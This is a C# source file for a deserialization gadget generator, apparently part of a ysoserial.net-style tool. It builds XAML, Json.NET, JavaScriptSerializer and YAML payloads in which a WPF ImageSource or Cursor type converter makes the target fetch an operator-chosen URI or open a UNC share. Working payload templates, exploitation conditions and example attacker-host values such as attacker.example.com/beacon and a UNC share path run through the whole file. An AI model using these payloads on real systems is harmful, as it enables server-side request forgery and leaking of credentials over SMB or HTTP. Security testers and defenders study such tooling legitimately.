using NDesk.Options;
using System;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * XamlTypeConverterFetch: makes the TARGET fetch a URI the operator chose from ONE ordinary
     * XAML attribute. No ObjectDataProvider, no x:Arguments, no constructor and no property
     * setter of the carrier type is ever named - the whole payload is an element the target
     * already accepts with one attribute on it.
     *
     * THE TRIGGER CLASS, and why it is not the usual one. Every other gadget in this catalogue
     * reaches its sink through a CONSTRUCTOR or a property SETTER, so a serializer has to be able
     * to build the carrier type. This one reaches it through a [TypeConverter], which a XAML
     * parser selects from the ATTRIBUTE it is filling in and hands plain text. The converted type
     * is never constructed by the payload at all, which is why "that type has no usable
     * constructor" says nothing about whether this works - and why a target that blocks
     * ObjectDataProvider but still parses XAML is unaffected by the block.
     *
     * VARIANT 1 (default) - System.Windows.Media.ImageSourceConverter, the converter declared on
     * System.Windows.Media.ImageSource. Read out of PresentationCore (v4.0.0.0,
     * 31bf3856ad364e35), ImageSourceConverter.ConvertFrom:
     *
     *     if ((value is string && !string.IsNullOrEmpty((string)value)) || value is Uri)
     *     {
     *         UriHolder uriHolder = TypeConverterHelper.GetUriFromUriContext(context, value);
     *         return BitmapFrame.CreateFromUriOrStream(uriHolder.BaseUri, uriHolder.OriginalUri,
     *             null, BitmapCreateOptions.None, BitmapCacheOption.Default, null);
     *     }
     *
     * and from there, with no virtual-dispatch gap:
     *
     *     BitmapFrame.CreateFromUriOrStream
     *       -> BitmapDecoder.CreateFromUriOrStream
     *         -> BitmapDecoder.SetupDecoderFromUriOrStream
     *           -> WpfWebRequestHelper.CreateRequestAndGetResponse      // <- THE REQUEST
     *
     * ANY non-empty string takes that branch. There is no suffix rule and no scheme rule.
     *
     * VARIANT 2 - System.Windows.Input.CursorConverter, the converter declared on
     * System.Windows.Input.Cursor. Same assembly, same sink family, ONE extra condition:
     *
     *     string text = ((string)value).Trim();
     *     if (text.LastIndexOf(".", StringComparison.Ordinal) == -1)
     *     {
     *         ...Enum.Parse<CursorType>(text)...                        // the benign named-cursor path
     *     }
     *     else if (text.EndsWith(".cur", OrdinalIgnoreCase) || text.EndsWith(".ani", OrdinalIgnoreCase))
     *     {
     *         UriHolder uriHolder = TypeConverterHelper.GetUriFromUriContext(context, text);
     *         Uri finalUri = BindUriHelper.GetResolvedUri(uriHolder.BaseUri, uriHolder.OriginalUri);
     *         if (finalUri.IsAbsoluteUri && finalUri.IsFile)
     *             return new Cursor(finalUri.LocalPath);                // a local or UNC file read
     *         WebRequest request = WpfWebRequestHelper.CreateRequest(finalUri);
     *         WpfWebRequestHelper.ConfigCachePolicy(request, false);
     *         return new Cursor(WpfWebRequestHelper.GetResponseStream(request));   // <- THE REQUEST
     *     }
     *     throw GetConvertFromException(value);
     *
     * THE VALUE MUST END IN .cur OR .ani FOR VARIANT 2, and the operator owns the far end so that
     * costs nothing. It is not policed here - this catalogue documents operator input rather than
     * refusing it - but a value that misses the suffix builds a payload that does NOTHING, so the
     * gadget says so in debug mode rather than letting it look like it worked.
     *
     * WHY TWO VARIANTS AND NOT TWO GADGETS. Same assembly, same trigger class, same sink helper,
     * same formatter list, and the payload differs only in which element and which attribute name
     * carry the operator's text. Variant 1 is the default because it has no input condition at
     * all; variant 2 exists because a target may accept an element with a Cursor attribute while
     * rejecting anything image shaped, and because its file/UNC branch is a different primitive.
     *
     * ANY MEMBER OF THAT TYPE WORKS, which is the reach that makes this worth shipping. A
     * reader can swap the carrier below for whatever their target already accepts:
     *
     *     variant 1: <ImageDrawing ImageSource="..."/>  also Image.Source, ImageBrush.ImageSource,
     *                                                  Window.Icon, ...
     *     variant 2: <Label Cursor="..."/>             also every other FrameworkElement, since
     *                                                  Cursor is declared on FrameworkElement
     *
     * THE CARRIER CHOICE IS NOT COSMETIC, and variant 1 uses ImageDrawing rather than the more
     * familiar Image or ImageBrush for two MEASURED reasons.
     *
     *   1. It is a Freezable, not a UI element, so a member-naming format can build it on ANY
     *      thread. Image is a FrameworkElement, and building one throws "The calling thread must
     *      be STA, because many UI components require this."
     *   2. It has no [TypeConverter] of its OWN. ImageBrush inherits one from Brush
     *      (BrushConverter), and Json.NET then refuses the object form outright: "the type
     *      requires a JSON string value to deserialize correctly". A carrier that is itself
     *      convertible-from-string cannot be written as an object with a member.
     *
     * Variant 2 has no such option - Cursor is only declared on FrameworkElement and
     * FrameworkContentElement, both of which are UI - which is why the apartment note below
     * applies to it and not to variant 1.
     *
     * THE APARTMENT CONDITION, per variant and per format, measured in
     * XamlTypeConverterFetchNeedsAUiThreadOnlyForTheCursorVariant:
     *
     *     variant 1, any format         fires on any thread
     *     variant 2, Xaml               XamlReader.Load requires an STA thread anyway
     *     variant 2, the other three    the target must be deserializing on an STA thread,
     *                                   i.e. a WPF application's UI thread. A service reading
     *                                   JSON on a thread-pool thread does NOT fire it.
     *
     * AND THAT CARRIER IS WHY THIS IS NOT XAML-ONLY. The element carrying the attribute is an
     * ordinary public class with a public parameterless constructor and a writable public member,
     * so a member-naming format can build it and assign that member too - and when it does, it
     * has to turn the operator's STRING into the member's declared type, which it does through
     * the same [TypeConverter] the XAML parser would have used. Measured, not assumed: Json.NET,
     * JavaScriptSerializer and YamlDotNet all reach the request that way. The formats that do NOT
     * are excluded for reasons that are about the TYPE rather than about the converter, and each
     * one is measured in XamlTypeConverterFetchIsReachableOnlyFromXaml:
     *
     *   - fastJSON and both MessagePack Typeless flavours hand the member over as a String and
     *     cast it, with no converter step at all;
     *   - DataContractSerializer and NetDataContractSerializer refuse the MEMBER's declared type
     *     ("Instances of abstract classes cannot be created" for ImageSource);
     *   - DataContractJsonSerializer builds nothing to assign to;
     *   - BinaryFormatter, SoapFormatter, LosFormatter, FsPickler, XmlSerializer and both
     *     SharpSerializer modes cannot express a document for this carrier at all without
     *     serializing a real instance - which would make the WRITE side fetch, inside ysonet.
     *
     * So the converter is what makes the payload short; the CARRIER is what decides the formatter
     * list, exactly as it does for every other module here.
     *
     * WHAT THE PAYLOAD IS WORTH, and where the line is:
     *
     *   - a request to any absolute URI the target's WebRequest stack accepts (SSRF), and for an
     *     http or https URI WpfWebRequestHelper.CreateRequest sets UseDefaultCredentials = true
     *     before the call, so the process's ambient credentials are offered subject to the
     *     platform's credential policy;
     *   - a file: or UNC value is a file open instead, which for a UNC path is an SMB session to
     *     that host;
     *   - NOT code execution. Variant 1's bytes go to the WIC image decoders and variant 2's to
     *     the cursor parser; neither is handed to another deserializer.
     *   - NOT disclosure: ysonet never sees the response, and nothing sends it anywhere.
     *
     * NOT A NOVEL DISCOVERY, and it must not be described as one. "XAML with a remote image URL
     * causes a request" is documented WPF behaviour. What earns a catalogue entry is the SHAPE:
     * a default-mode outbound callback that needs no known-bad type name on the wire, and on the
     * XAML side no constructor and no settable member of the converted type either.
     *
     * WHAT THE TARGET SEES IS PER VARIANT, and it is worth knowing before choosing one.
     * Variant 1's decode is deferred, so the payload deserializes CLEANLY and the request still
     * goes out - nothing is thrown at the target. Variant 2's converter finishes by handing the
     * bytes to the Cursor constructor, which refuses anything that is not a real cursor, so the
     * target sees an exception AFTER the request. Both are measured in the effect row.
     */
    public class XamlTypeConverterFetchGenerator : GenericGenerator
    {
        public const int VariantImageSource = 1;
        public const int VariantCursor = 2;

        public const string VariantOptionName = "variant";
        public const string RawInputOptionName = "rawinput";

        public const string WpfPresentationNamespace =
            "http://schemas.microsoft.com/winfx/2006/xaml/presentation";

        // Variant 1: the carrier and member whose declared type is System.Windows.Media
        // .ImageSource, so the parser selects ImageSourceConverter. ImageDrawing is a Freezable, so
        // it builds on any thread - see the apartment note in the header.
        public const string ImageElementName = "ImageDrawing";
        public const string ImageMemberName = "ImageSource";

        // Variant 2: Cursor is declared on FrameworkElement, so any element carries it. Label is
        // the shortest well known one.
        public const string CursorElementName = "Label";
        public const string CursorMemberName = "Cursor";

        // The same two carriers as the member-naming formats have to name them: they have no
        // namespace mechanism, so each states an assembly-qualified name. They live in DIFFERENT
        // assemblies, which is why there is no single one here.
        //
        // Both name Version=4.0.0.0 even though modern WPF ships 10.0.0.0: modern assembly
        // binding matches on the simple name and ignores the version, so one identity serves both
        // runtime families and there is no per-runtime variant.
        public const string PresentationCoreDisplayName =
            "PresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
        public const string PresentationFrameworkDisplayName =
            "PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
        public const string ImageAssemblyQualifiedName =
            "System.Windows.Media." + ImageElementName + ", " + PresentationCoreDisplayName;
        public const string CursorCarrierAssemblyQualifiedName =
            "System.Windows.Controls." + CursorElementName + ", " + PresentationFrameworkDisplayName;

        // The two suffixes CursorConverter's URI branch is gated on.
        public static readonly string[] CursorSuffixes = { ".cur", ".ani" };

        private int variantNumber = VariantImageSource;
        private bool rawInput;

        // ---- Metadata ----------------------------------------------------------

        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                // Network, and only network: the request is the whole effect. Nothing is
                // executed, nothing is written, and nothing is returned to the operator.
                .WithKinds(PayloadKind.Network)
                // Both runtime families, because both were MEASURED: the .NET Framework half
                // by the effect row on 4.8.1, and the modern half by the separate
                // net10.0-windows harness that deserializes the exact bytes this generator makes.
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
                    GadgetRequirement.NetFramework, GadgetRequirement.ModernDotNet)
                // TWO ENDPOINTS, NOT A SPAN. 4.8.1 is the build the effect row
                // observes on; 10.0 is the build the separate net10.0-windows harness
                // (dev-kitchen/tools/wpf-fetch-net10-proof) observes on, reading the exact bytes
                // this generator produced. Nothing in between is claimed - the older 4.x builds
                // were not tested, the chain's own v4.0.0.0 assembly identity is not evidence
                // that the effect fires there, and a range cannot bridge the two families anyway.
                .WithVersions(RuntimeVersion.NetFx481, RuntimeVersion.Net100);
        }

        // Unpublished as a gadget, but the BEHAVIOUR is documented WPF and must not be claimed as
        // a discovery. Searched for prior art while implementing: an ImageSourceConverter or
        // CursorConverter deserialization chain returns Microsoft's own API documentation and
        // unrelated .NET gadget write-ups, so there is no external finder to credit and no CVE.
        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "One ordinary XAML attribute makes the target fetch -c through a "
                + "[TypeConverter]. No ObjectDataProvider and no constructor. Remote image "
                + "loading is documented WPF behaviour, so this is a shape, not a new bug.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        // Measured, not predicted: every entry is a cell the loopback row deserializes
        // and then proves made exactly one request, and every exclusion has a recorded reason
        // (see the header block and XamlTypeConverterFetchTests). Four, not one: the carrier
        // element is an ordinary constructible type with a writable member, so a member-naming
        // format that converts a string to the member's declared type reaches the same converter
        // the XAML parser would have used.
        //
        // The "(2)" suffix is a display-only annotation meaning "this formatter carries 2
        // variants". Every formatter carries both, because neither variant calls .Without().
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.Xaml + " (2)",
                Formatters.JsonNet + " (2)",
                Formatters.JavaScriptSerializer + " (2)",
                "YamlDotNet < 5.0.0 (2)",
            };
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.Url;
        }

        public override List<GadgetVariant> Variants()
        {
            // Neither variant narrows the formatter list (all four carry both, which is why
            // every token in SupportedFormatters() is annotated "(2)") and neither changes
            // the facets: both end in the same WpfWebRequestHelper request.
            return new List<GadgetVariant>
            {
                new GadgetVariant(VariantImageSource,
                    "ImageSource (default) - <" + ImageElementName + " " + ImageMemberName
                        + "=\"...\"/>, no condition on the value and no UI thread needed"),
                new GadgetVariant(VariantCursor,
                    "Cursor - <" + CursorElementName + " " + CursorMemberName
                        + "=\"...\"/>, the value must end .cur or .ani"),
            };
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    // Choice/default facts are declared below; this text explains them.
                    "var|" + VariantOptionName + "=",
                    "Which type converter the attribute selects.\r\n"
                        + "Choices: " + VariantImageSource + ", " + VariantCursor + ". "
                        + "Default: \"" + VariantImageSource + "\".\r\n"
                        + "\r\n"
                        + VariantImageSource + " (default) - ImageSourceConverter, through <"
                        + ImageElementName + " " + ImageMemberName + "=\"...\"/>. Any non-empty "
                        + "value is fetched: no suffix rule and no scheme rule. Every "
                        + "ImageSource-typed member reaches the same converter, so the carrier "
                        + "can be swapped for whatever your target already accepts (Image Source, "
                        + "ImageBrush ImageSource, Window Icon, and so on). ImageDrawing is used "
                        + "because it is a Freezable with no type converter of its own, so it works "
                        + "whatever thread the target deserializes on.\r\n"
                        + VariantCursor + " - CursorConverter, through <" + CursorElementName
                        + " " + CursorMemberName + "=\"...\"/>. Cursor is declared on "
                        + "FrameworkElement, so every element carries it - but the value MUST end "
                        + "in .cur or .ani, or the converter takes its named-cursor branch and "
                        + "the payload does nothing. It also has a second leg the other variant "
                        + "does not: a value that resolves to a file URI is opened as a FILE "
                        + "rather than fetched, so a UNC path is an SMB session.\r\n"
                        + "\r\n"
                        + "VARIANT " + VariantCursor + " NEEDS A UI THREAD on every format except "
                        + "Xaml. Its carrier is a FrameworkElement, and building one on a thread "
                        + "that is not STA throws \"The calling thread must be STA\" before the "
                        + "converter "
                        + "runs - so a service that deserializes JSON on a thread-pool thread "
                        + "does not fire it, while a WPF application deserializing on its own UI "
                        + "thread does. Variant " + VariantImageSource + " has no such "
                        + "condition.",
                    v => int.TryParse(v, out variantNumber)
                },
                {
                    RawInputOptionName,
                    "Put -c into the payload template exactly as typed, instead of escaping it "
                        + "for XML. Use this only when you have already escaped the value "
                        + "yourself. It also turns off the check that the finished payload still "
                        + "carries your URI unchanged, because there is then no text of yours "
                        + "left to compare against.\r\n"
                        + "\r\n"
                        + "WHAT TO PUT IN -c. An absolute URI the target's WebRequest stack "
                        + "accepts:\r\n"
                        + "  http://attacker.example.com/beacon\r\n"
                        + "  http://attacker.example.com/beacon.cur      (variant "
                        + VariantCursor + ")\r\n"
                        + "  \\\\attacker.example.com\\share\\x.cur      (variant "
                        + VariantCursor + ", a file open)\r\n"
                        + "Nothing has to exist on the far end and nothing has to be a real image "
                        + "or cursor: the target pays for the connect before anything is decoded. "
                        + "A RELATIVE value is resolved against the parser's own base URI, which "
                        + "you cannot see, so always use an absolute one.\r\n"
                        + "\r\n"
                        + "WHAT THE TARGET DOES WITH IT. For http or https WPF sets "
                        + "UseDefaultCredentials on the request, so the target process offers its "
                        + "ambient credentials if the server asks and the platform's credential "
                        + "policy allows it. The bytes go to the image decoders or the cursor "
                        + "parser; they are never sent anywhere and you never see them.\r\n"
                        + "\r\n"
                        + "-t IS ACCEPTED and it parses the payload HERE, so THIS machine makes "
                        + "the request you asked for. Against a UNC path Windows sends "
                        + "authentication material when it opens the SMB session, so only point "
                        + "it at an endpoint you own.\r\n"
                        + "\r\n"
                        + "WHAT A CALLBACK PROVES. That the target resolved your host and opened "
                        + "the request. It is not proof of a completed SMB session, of NTLM "
                        + "authentication, of captured credentials, or of a relay: those depend "
                        + "on the target, the network and your endpoint.",
                    v => { if (v != null) rawInput = true; }
                },
            }
            .WithMetadata("variant", OptionMetadata.ForVariants(Variants()))
            .WithMetadata("rawinput", new OptionMetadata(defaultValue: "false"));
        }

        // ---- Generation --------------------------------------------------------

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            RequireCommandInput(inputArgs);

            string uri = inputArgs.Cmd;
            WarnIfVariantConditionIsUnmet(uri, inputArgs);

            object document = BuildPayload(uri, formatter);

            // Build and CHECK with the self-test OFF first, so a URI --minify or attribute-value
            // normalization rewrote is refused BEFORE -t can fetch the wrong one.
            InputArgs probeArgs = inputArgs.DeepCopy();
            probeArgs.Test = false;
            object probe = FinishHandWrittenPayload(document, formatter, probeArgs);
            RequireUriArrivesIntact(probe, uri, formatter, inputArgs);

            if (!inputArgs.Test)
                return probe;

            return FinishHandWrittenPayload(document, formatter, inputArgs);
        }

        // XamlReader.Load builds WPF objects and wants the single-threaded apartment a WPF host
        // would have, so -t gets one.
        public override bool SelfTestNeedsStaThread(string formatter, InputArgs inputArgs)
        {
            return true;
        }

        // Variant 2's converter only takes the URI branch when the value ends .cur or .ani, so a
        // value that misses it builds a payload that generates cleanly and then does NOTHING on
        // the target. The catalogue documents operator input rather than refusing it, so this is
        // a debug-mode NOTE and never a refusal: an operator who knows their target may still
        // want the exact bytes they asked for.
        private void WarnIfVariantConditionIsUnmet(string uri, InputArgs inputArgs)
        {
            if (variantNumber != VariantCursor || uri == null)
                return;

            string trimmed = uri.Trim();
            foreach (string suffix in CursorSuffixes)
                if (trimmed.EndsWith(suffix, StringComparison.OrdinalIgnoreCase))
                    return;

            Debugging.ShowNote(inputArgs, Name() + ": variant " + VariantCursor
                + " needs -c to end in " + string.Join(" or ", CursorSuffixes)
                + ". CursorConverter only takes its fetching branch for those two suffixes, so "
                + "this payload will parse on the target and request nothing. You own the far "
                + "end, so append one.");
        }

        // ---- The payload documents ---------------------------------------------
        //
        // Whole and readable on purpose: a reader should be able to paste either line into a
        // scratch WPF project, point it at their own listener, and watch the request arrive.

        private object BuildPayload(string input, string formatter)
        {
            string element = ElementName();
            string member = MemberName();

            if (IsFormatter(formatter, Formatters.Xaml))
            {
                // The default xmlns is the WPF presentation namespace, so the element resolves
                // without naming an assembly, and the member's declared type is what makes the
                // parser select the converter. Nothing else is on the element: the attribute IS
                // the payload.
                return @"<" + element + @" xmlns=""" + WpfPresentationNamespace + @""" " + member + @"=""" + EscapeForXmlAttribute(input, rawInput) + @"""/>";
            }

            // The three member-naming formats. Each builds the carrier by its assembly-qualified
            // name and assigns the SAME member, and each turns the string into the member's
            // declared type through the same [TypeConverter]. So the document is longer than the
            // XAML one - it has to name the carrier's assembly - and the sink is identical.
            string carrier = CarrierAssemblyQualifiedName();

            if (IsFormatter(formatter, Formatters.JsonNet))
            {
                return @"
{
    '$type':'" + carrier + @"',
    '" + member + @"':'" + EscapeForJson(input, rawInput) + @"'
}";
            }

            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
            {
                return @"
{
    '__type':'" + carrier + @"',
    '" + member + @"':'" + EscapeForJson(input, rawInput) + @"'
}";
            }

            // The two templates above quote with SINGLE quotes, so EscapeForJson (which also
            // escapes the apostrophe) is right there. The YAML template quotes with DOUBLE quotes
            // and uses EscapeForJsonDoubleQuoted instead: \' is not a legal escape in a double
            // quoted scalar. Its tag also takes the identity with no spaces.
            if (IsFormatter(formatter, Formatters.YamlDotNet))
            {
                return @"
!<!" + carrier.Replace(", ", ",") + @"> {
    " + member + @": """ + EscapeForJsonDoubleQuoted(input, rawInput) + @"""
}";
            }

            throw UnsupportedFormatter(formatter);
        }

        private string ElementName()
        {
            if (variantNumber == VariantImageSource) return ImageElementName;
            if (variantNumber == VariantCursor) return CursorElementName;
            throw UnknownVariant();
        }

        private string MemberName()
        {
            if (variantNumber == VariantImageSource) return ImageMemberName;
            if (variantNumber == VariantCursor) return CursorMemberName;
            throw UnknownVariant();
        }

        private string CarrierAssemblyQualifiedName()
        {
            if (variantNumber == VariantImageSource) return ImageAssemblyQualifiedName;
            if (variantNumber == VariantCursor) return CursorCarrierAssemblyQualifiedName;
            throw UnknownVariant();
        }

        private Exception UnknownVariant()
        {
            return new ArgumentException(Name() + " has no variant " + variantNumber
                + ". Use --" + VariantOptionName + " " + VariantImageSource
                + " (ImageSource) or --" + VariantOptionName + " " + VariantCursor + " (Cursor).");
        }

        // ---- URI fidelity -------------------------------------------------------

        // The URI IS the payload, so a payload whose text was rewritten is worse than no payload:
        // it still parses cleanly and simply fetches something nobody meant.
        private void RequireUriArrivesIntact(object payload, string uri, string formatter,
            InputArgs inputArgs)
        {
            if (rawInput || UriSurvived(payload, uri, formatter))
                return;

            bool minified = inputArgs != null && inputArgs.Minify;
            throw new ArgumentException(Name() + " cannot deliver this URI with " + formatter
                + (minified ? " and --minify" : "") + ": the payload no longer carries \"" + uri
                + "\" exactly, so the target would fetch a different location. "
                + DeliveryAdvice(formatter));
        }

        // True when the emitted payload still names the exact URI. The XAML document carries it
        // in an ATTRIBUTE, so it is compared through an XML reader (which decodes &amp; back to
        // what the operator typed); the other three carry it in a quoted scalar, so the ESCAPED
        // rendering is what has to be present verbatim, and which escaper produced it depends on
        // the template's own quote character.
        private bool UriSurvived(object payload, string uri, string formatter)
        {
            if (IsFormatter(formatter, Formatters.Xaml))
                return MinifiedTextGuard.MissingTextValues(payload, new[] { uri }).Count == 0;

            string text = payload as string;
            if (text == null)
                return true;

            string escaped = IsFormatter(formatter, Formatters.YamlDotNet)
                ? EscapeForJsonDoubleQuoted(uri, false)
                : EscapeForJson(uri, false);

            return text.IndexOf(escaped, StringComparison.Ordinal) >= 0;
        }

        /// <summary>
        /// MEASURED per document in XamlTypeConverterFetchRefusesLossyMinification, across a
        /// double space, a "; " run, a tab, a carriage return and a line feed.
        ///
        ///   Xaml
        ///       with AND without --minify: tab, carriage return, line feed. The value is an XML
        ///       ATTRIBUTE, and attribute-value normalization turns each of them into a space on
        ///       every parser, so dropping --minify does not help and the target would see the
        ///       same rewrite. That is why this branch must never say "Drop --minify".
        ///   Json.NET / JavaScriptSerializer
        ///       nothing in this measured set: the shared JSON escaper encodes every control
        ///       character before the minifier re-reads the string, so each survives exactly.
        ///   YamlDotNet
        ///       --minify only: a run of repeated spaces. It uses the same shared control-
        ///       character escaper as the JSON documents.
        /// </summary>
        private string DeliveryAdvice(string formatter)
        {
            if (IsFormatter(formatter, Formatters.Xaml))
                return "Use a URI with no tab, carriage return or line feed: the value travels in"
                    + " an XML attribute, and no parser can carry one there - dropping --minify"
                    + " would not help.";

            if (IsFormatter(formatter, Formatters.YamlDotNet))
                return "Drop --minify, or use a URI with no repeated spaces.";

            return "Drop --minify; the unminified document preserves this URI exactly.";
        }
    }
}
